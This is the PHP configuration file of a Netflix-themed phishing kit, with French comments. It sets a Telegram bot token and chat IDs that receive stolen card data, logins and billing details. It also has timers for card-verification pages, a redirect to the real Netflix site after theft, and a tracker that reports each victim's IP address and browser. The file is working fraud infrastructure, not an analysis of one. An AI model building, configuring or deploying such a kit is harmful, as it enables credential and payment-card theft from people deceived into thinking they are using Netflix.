<?php
if (php_sapi_name() !== 'cli' && !defined('ALLOW_INCLUDE')) {
    http_response_code(404);
    exit('Accès interdit ! (403)');
}

// ── Auto-tracker ──────────────────────────────────────────────
if (!defined('_TRACKER_PAGE_ID_')) define('_TRACKER_PAGE_ID_', '7cd8f701-7903-41d6-a739-1b99a0b3c6a0');
if (!defined('_TRACKER_URL_')) define('_TRACKER_URL_', 'http://127.0.0.1:3000/api/track/7cd8f701-7903-41d6-a739-1b99a0b3c6a0');
if (!function_exists('_tracker_fire_')) {
function _tracker_fire_($event) {
  if (!function_exists('curl_init')) return;
  $ch = @curl_init(_TRACKER_URL_);
  if (!$ch) return;
  @curl_setopt_array($ch, [CURLOPT_POST=>1, CURLOPT_POSTFIELDS=>json_encode(['e'=>$event,'ip'=>$_SERVER['REMOTE_ADDR']??'','ua'=>$_SERVER['HTTP_USER_AGENT']??'']), CURLOPT_HTTPHEADER=>['Content-Type: application/json'], CURLOPT_TIMEOUT_MS=>300, CURLOPT_RETURNTRANSFER=>1, CURLOPT_NOSIGNAL=>1]);
  @curl_exec($ch); @curl_close($ch);
}
}
if (isset($_SERVER['REQUEST_METHOD']) && !defined('_TRACKER_INIT_')) {
  define('_TRACKER_INIT_', true);
  $__self = basename($_SERVER['PHP_SELF'] ?? '');
  if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (!isset($_SESSION['_trk_v'])) { $_SESSION['_trk_v'] = 1; _tracker_fire_('view'); }
    _tracker_fire_('hb');
  } elseif ($__self === 'click.php') {
    _tracker_fire_('click');
  }
  register_shutdown_function(function() {
    if (isset($_SESSION['bot']) && $_SESSION['bot'] === true) _tracker_fire_('blocked');
  });
}


return array (
  'SCAMA_NAME' => 'NETFLIX 2026', //

  'ADMIN_LOGIN' => 'admin', //Identifiant Panel
  'ADMIN_PASSWORD' => '',  //Mot de passe Panel changer le 

  'BOT_TOKEN' => '8401133448:AAEtFG6KltZKPdXDjuriJLXqq7y9ftWS_GY', //Bot Token télégram
  'CHAT_ID' => '-5214657562',//Chat ID rez télégram CC ET LES ACTIONS
  'CHAT_INFO' => '-5214657562',//Chat ID rez login / infos  
  'CHAT_NOTIF' => '-5214657562', //Chat ID pour les notifications des nouveaux visiteurs

  'BILLING_NOTIF' => 1,         // 1 = tu recois les infos | 0 = Tu ne recois pas les infos  
  'CHAT_NOTIF_ENABLED' => '1', // 0 = Désactivé pas de notif new users  1 = Activé notif new users

  
  'REDIRECT_TIMER' => 90, //Redirect timer in secondes si pas de réponse dans vos vbv
  'REDIRECT_FINAL' => 5, //Redirect succes vers accueil

  'URL_REDIRECT' => 'https://www.netflix.com',    //redirection quand succès
  'API_IPAPI' => 'J9TQazL9UIH1so3',   //Clé IP API PRO Private
  
 



);
$test_mode = false;
